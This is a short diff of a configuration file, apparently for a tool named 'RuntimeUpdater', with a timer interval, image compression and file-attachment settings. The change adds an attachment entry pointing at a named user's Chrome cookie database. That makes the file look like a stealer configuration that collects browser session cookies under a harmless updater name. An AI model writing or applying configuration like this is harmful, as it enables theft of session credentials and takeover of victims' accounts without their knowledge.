@@ -12,4 +12,5 @@ TIME=900000
 [IMAGE]
 COMPRESSION=100
 [FILE]
-ATTACH=D:\Dropbox\Projects\RuntimeUpdater\Win32\Release\ssleay32.dll
+ATTACH=D:\Dropbox\Projects\RuntimeUpdater\RuntimeUpdater_Icon.ico
+ATTACH2=C:\Users\ZongerX\AppData\Local\Google\Chrome\User Data\Default\Cookies
